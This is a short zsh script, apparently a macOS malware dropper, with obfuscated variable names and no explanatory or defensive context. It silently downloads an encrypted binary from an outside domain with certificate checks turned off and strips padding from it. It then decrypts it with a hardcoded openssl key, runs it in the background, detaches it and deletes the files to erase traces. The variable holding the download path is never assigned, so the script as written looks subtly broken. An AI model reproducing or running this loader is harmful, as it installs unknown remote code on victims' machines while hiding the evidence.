#!/bin/zsh
mk2a8=$(mktemp /tmp/rws64m.XXXXXX)
curl -kfsSL "https://daisoftwarelimited.com/fd8a70f7f5c848a7ab6f2fea13d547ca/m20dd47a1907a9f51.bin" -o "$mk2a8z" || exit 1
nk5b2h=$(stat -f %z "$mk2a8z"); dk4pdsf=$(( nk5b2h - 3925 - 3664 ))
tail -c +$(( 3925 + 1 )) "$mk2a8z" | head -c $dk4pdsf | openssl enc -d -aes-256-cbc -k b3bb4ce88f4c7f0f799cb312 -out "$mk2a8" 2>/dev/null
[ -s "$mk2a8" ] && chmod 700 "$mk2a8" && ( "$mk2a8" & ) && disown
( sleep 3; rm -f "$mk2a8" "$mk2a8z" ) &>/dev/null &
